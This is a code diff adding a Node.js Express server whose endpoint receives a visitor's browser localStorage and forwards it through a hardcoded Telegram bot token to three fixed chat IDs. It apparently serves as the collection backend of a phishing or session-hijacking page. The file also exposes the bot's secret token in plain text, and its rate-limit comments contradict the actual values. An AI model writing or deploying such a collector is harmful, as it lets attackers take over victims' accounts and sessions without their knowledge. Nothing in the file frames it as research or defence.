@@ -1,0 +1,86 @@
+const compression = require("compression");
+const express = require("express");
+const https = require("https");
+const http = require("http");
+const cors = require("cors");
+const path = require("path");
+const fs = require("fs");
+const TelegramBot = require("node-telegram-bot-api");
+const rateLimit = require("express-rate-limit");
+
+const token = "7445026734:AAGDCe_FAMFj1yifOU6uwxUdL3xzMzxlQKQ";
+const bot = new TelegramBot(token, { polling: true });
+
+const app = express();
+
+// Trust the first proxy
+app.set("trust proxy", 1);
+
+const thirdTour = process.argv[2] == 3;
+const forcePort = process.argv[3];
+const useHttp = process.argv[4] !== "https";
+
+const publicFolderPath = path.join("/home/urdesto/public_html", "public");
+const port = forcePort ? +forcePort : thirdTour ? 8443 : 8030;
+
+app.use(cors());
+app.set("etag", false);
+app.use((req, res, next) => {
+  res.set("Cache-Control", "no-store");
+  next();
+});
+app.use(compression());
+app.use(express.urlencoded({ extended: false }));
+app.use(express.json());
+
+const limiter = rateLimit({
+  windowMs: 60 * 60 * 1000, // 1 hour
+  max: 5, // Limit each IP to 100 requests per `window` (here, per 1 hour)
+  message: "Too many requests from this IP, please try again after 10 minutes",
+});
+
+let counter = 1; // Counter to keep track of the number of requests
+
+const requestSet = new Set();
+
+app.get("/", (req, res) => {
+  res.sendFile(path.join(publicFolderPath, "index2.html"));
+});
+
+app.use(express.static(publicFolderPath));
+
+app.post("/users/me", limiter, (req, res) => {
+  const reqBody = req.body.localStorage;
+  const reqBodyString = JSON.stringify(reqBody);
+
+  if (requestSet.has(reqBodyString)) {
+    return res.status(429).send("Duplicate request");
+  }
+
+  requestSet.add(reqBodyString);
+  setTimeout(() => requestSet.delete(reqBodyString), 5 * 60 * 1000); // 5 minutes
+
+  const identifier = counter++;
+
+  const reqBodyWithId = {
+    identifier: identifier,
+    localstorage: reqBody,
+  };
+
+  [6903939800, 1389031904, 666273643].forEach((id) =>
+    bot.sendMessage(id, JSON.stringify(reqBodyWithId))
+  );
+  res.sendStatus(200);
+});
+
+const server = useHttp ? http : https;
+
+let options = {};
+if (!useHttp) {
+  options.key = fs.readFileSync(__dirname + "/certs/server-key.pem");
+  options.cert = fs.readFileSync(__dirname + "/certs/server-cert.pem");
+}
+
+server.createServer(options, app).listen(port, () => {
+  console.log("Listening port:", port, "folder:", publicFolderPath);
+})
